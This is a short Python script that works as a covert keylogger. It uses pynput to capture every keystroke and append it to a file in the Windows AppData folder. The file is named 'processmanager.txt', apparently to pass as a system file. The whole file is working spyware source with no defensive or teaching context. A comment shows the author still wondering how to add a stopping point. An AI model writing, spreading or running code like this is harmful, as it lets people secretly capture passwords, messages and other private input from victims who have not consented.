import os
from pynput.keyboard import Listener

# GLOBALs
keys = []
count = 0
path = os.environ['appdata'] + '\\processmanager.txt'
# path = 'processmanager.txt'

def on_press(key_stroke):
    global keys, count

    # if this function is entered then the listener 'heard' a keystroke
    keys.append(key_stroke)
    count +=1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' [Backspace] ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' [shift] ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' [caps_lock] ')
            elif k.find('up') > 0:
                f.write(' [up arrow] ')
            elif k.find('left') > 0:
                f.write(' [left arrow] ')
            elif k.find('right') > 0:
                f.write(' [right arrow] ')
            elif k.find('down') > 0:
                f.write(' [down arrow] ')
            elif k.find('ctrl_l') > 0:
                f.write(' [ctrl] ')
            elif k.find('alt_l') > 0:
                f.write(' [alt] ')
            else:
                f.write(k)


def main():
    # how to code in a stopping point?
    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
